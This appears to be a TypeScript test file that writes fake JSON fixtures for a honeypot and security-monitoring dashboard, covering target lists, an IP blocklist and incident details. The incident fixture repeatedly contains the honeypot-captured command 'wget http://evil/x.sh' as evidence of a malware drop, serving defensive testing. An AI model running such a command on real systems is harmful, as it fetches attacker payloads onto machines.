// #94 시험 픽스처 → JSON(목 서버가 읽는다). 84/mock/fixtures.dump.test.ts 에 차단 목록 · 사건 상세 · 출발지 상세를 더했다.
// 모두 가짜 자료다. 시각은 목 서버가 응답마다 as_of 를 지금으로 옮겨 맞춘다(as_of 없는 응답은 그대로)
import { writeFileSync } from 'node:fs'
import { it } from 'vitest'
import { awsSensor, consoleTarget, COWRIE, dataNode, nodeTarget, targetsQueue, targetsResult, web01 } from '@/test/targets-fixtures'
import { blockEntry, BLOCKS_BY_POINT, controlHealth, MONITORING_SUMMARY } from '@/test/monitoring-fixtures'
import { logsResult, sshLine, webLine } from '@/test/device-logs-fixtures'
import { nodeEntry } from '@/test/operations-fixtures'
import { sourceDetail } from '@/test/sources-fixtures'

const OUT = '<작업 폴더>/mock/fixtures'
const put = (name: string, body: unknown) => writeFileSync(`${OUT}/${name}.json`, JSON.stringify(body, null, 1))

it('dump', () => {
  const queue = targetsQueue()
  put('targets-1', targetsResult({ targets: [awsSensor(), web01(), consoleTarget(), dataNode()], queue }))
  put('targets-2', targetsResult({ targets: [awsSensor(), web01(), consoleTarget(), dataNode(), nodeTarget('web-02')], queue }))
  put('summary', { ...MONITORING_SUMMARY, blocks_by_point: BLOCKS_BY_POINT })
  put('health-ok', controlHealth())
  put('logs', logsResult({ items: Array.from({ length: 12 }, (_, i) => (i % 3 === 2 ? sshLine(i) : webLine(i))) }))
  const as_of = '2026-09-23T08:00:00Z'
  put('nodes-4', { as_of, rows: [
    nodeEntry(), nodeEntry({ node_id: 'web-02', hostname: 'opsloop-web-02', addr: '192.0.2.22', reception: 'silent' }),
    nodeEntry({ node_id: 'pend-01', hostname: 'opsloop-pend-01', addr: '192.0.2.31', reception: 'waiting', last_seen_at: null, registered_at: null }),
    nodeEntry({ node_id: 'old-01', hostname: 'opsloop-old-01', addr: '192.0.2.41', reception: 'revoked', status: 'revoked' }),
  ] })
  // 차단 목록: 살아 있는 차단 6건(지점 결과가 섞임) · 해제 1건. 접힌 주의 칸(집행 대기 · 내부 방화벽 미확인)이 0 보다 크게
  const ok = (since: string) => ({ state: 'confirmed' as const, since, mode: 'nft', note: null })
  const pending = (since: string) => ({ state: 'pending' as const, since, mode: null, note: null })
  const failed = (since: string) => ({ state: 'failed' as const, since, mode: 'nft', note: '적용 실패(가짜 자료)' })
  const t = '2026-09-23T07:59:00Z'
  put('blocklist', [
    blockEntry({ actor_ip: '203.0.113.10', enforced_at: t, enforcement: { gateway: ok(t), fw: ok(t) } }),
    blockEntry({ actor_ip: '203.0.113.11', enforcement: { gateway: ok(t), fw: pending(t) } }),
    blockEntry({ actor_ip: '203.0.113.12', enforcement: { gateway: pending(t), fw: pending(t) } }),
    blockEntry({ actor_ip: '203.0.113.13', enforcement: { gateway: ok(t), fw: failed(t) } }),
    blockEntry({ actor_ip: '203.0.113.14', points: ['fw'], enforcement: { fw: ok(t) } }),
    blockEntry({ actor_ip: '203.0.113.15', expires_at: '2026-09-23T20:00:00Z', enforcement: { gateway: ok(t), fw: ok(t) } }),
    blockEntry({ actor_ip: '203.0.113.16', released_at: '2026-09-23T07:00:00Z' }),
  ])
  // 사건 상세: 종결(실제 위협 판정 · 재판정 폼이 접힘)과 미판정(펼침). IncidentDetailPage.test.tsx 의 표본과 같은 모양
  const KEY = 'R003|v2|4.4.66.84|2026-09-18T06:00:00+00:00'
  const detail = {
    incident_key: KEY, rule_id: 'R003', rule_version: 'v2', rule_name: '악성코드 투하', severity: 'critical', actor_ip: '4.4.66.84', target: null,
    first_ts: '2026-09-18T06:00:00+00:00', last_ts: '2026-09-18T06:10:00+00:00', signal_count: 3, session_count: 1, status: 'open',
    created_at: '2026-09-18T06:10:05+00:00',
    evidence: { sample: [{ ts: '2026-09-18T06:00:00+00:00', shasum: 'abc123', url: 'http://evil/x.sh' }], sessions: ['s-1'], observed_count_max: 3 },
    actions: [], verdicts: [] as unknown[],
    related: [{ incident_key: 'R001|v2|4.4.66.84|2026-09-17T01:00:00+00:00', rule_id: 'R001', severity: 'low', first_ts: '2026-09-17T01:00:00+00:00', signal_count: 40, status: 'resolved' }],
    behavior: [
      { ts: '2026-09-18T05:58:00+00:00', sensor: 'hp-01', eventid: 'cowrie.login.success', session: 's-1', username: 'root', input: null, url: null, shasum: null, http_method: null, http_status: null },
      { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null },
    ],
    actor: { history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 120, sensors: ['hp-01'], sessions: 7 }, rules: [{ rule_id: 'R001', incidents: 2 }], blocked: null },
    raw: [{ ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null, has_password: false, user_agent: null, message: 'CMD: wget http://evil/x.sh' }],
    circular: '규칙 조건이 파일 이동이고 판정 기준의 위협 조건도 같다',
    devices: [{ ...COWRIE, basis: 'confirmed' }], device_state: 'confirmed', device_fallback: [],
  }
  put('incident-open', detail)
  put('incident-judged', { ...detail, status: 'resolved', verdicts: [
    { id: 1, verdict: 'threat', proposed: 'threat', decision_seconds: 95, reason: '파일 투하 확인', observed_value: 3, operator: 'han', created_at: '2026-09-18T06:40:00+00:00' },
    { id: 2, verdict: 'threat', proposed: 'threat', decision_seconds: 30, reason: '재확인', observed_value: 3, operator: 'han', created_at: '2026-09-18T09:00:00+00:00' },
  ] })
  // 출발지 상세: 규칙 범위 · 확인 · 장비 미확인 사건 각 1건
  const base = sourceDetail()
  put('source-detail', { ...base, incidents: [...base.incidents,
    { incident_key: 'R005|v3|198.51.100.23|2026-09-29T02:50:00+00:00', rule_id: 'R005', rule_version: 'v3', rule_name: '기준선 이탈', severity: 'low', status: 'open', first_ts: '2026-09-29T02:50:00Z', last_ts: '2026-09-29T02:55:00Z', target: null, verdict: null, devices: [], device_state: 'unconfirmed', device_fallback: [COWRIE] },
  ], incidents_total: 3 })
})
